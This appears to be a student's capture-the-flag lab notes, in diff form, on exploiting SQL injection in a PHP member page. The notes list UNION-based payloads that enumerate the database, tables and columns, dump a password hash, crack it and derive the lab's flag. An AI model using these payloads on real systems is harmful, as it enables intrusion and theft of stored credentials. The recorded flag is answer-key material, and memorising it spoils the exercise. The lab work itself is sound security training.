@@ -1,0 +1,73 @@
+ 
+
+
+
+index.php?page=member
+
+
+
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'as' at line 1
+
+Query used
+gino
+Unknown column 'gino' in 'where clause'
+
+1 OR TRUE
+
+1 union all select 1, NULL
+1 union all select 1, NULL, NULL
+find the number of column in the original query
+
+1 union all select 1, database();
+Member_Sql_Injection
+1 union all select 1, user();
+borntosec@localhost
+
+1 union all select 1, table_name, NULL
+Unknown column 'table_name' in 'field list'
+
+
+DB:Member_Sql_Injection
+USER:borntosec@localhost
+
+1 union all select 1, concat(table_name) from Information_schema.tables
+all the tables in multiple record
+
+1 union all select 1, group_concat(table_name) from Information_schema.tables
+all the tables in one row
+users
+
+1 union all select 1, concat(table_name) from Information_schema.tables where table_schema=schema()
+in the current schema
+users
+
+from Information_schema.columns where table_name="users"
+wrong
+from Information_schema.columns where table_name='users' and table_schema=schema()
+wrong syntax
+1 union all select 1, version()
+5.5.64-MariaDB-1ubuntu0.14.04.1
+
+1 union all select 1, concat(column_name) from Information_schema.columns where table_schema=schema()
+1 union all select 1, group_concat(column_name) from Information_schema.columns where table_schema=schema()
+
+user_id,first_name,last_name,town,country,planet,Commentaire,countersign
+
+1 union all select 1, group_concat(user_id) from users
+
+
+1 union all select 1, concat(Commentaire) from users
+Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+
+1 union all select 1, concat(countersign) from users
+5ff9d0165b4f92b14994e5c685cdce28
+
+maybe the password
+
+
+decrypt
+FortyTwo
+
+shasum 256
+
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
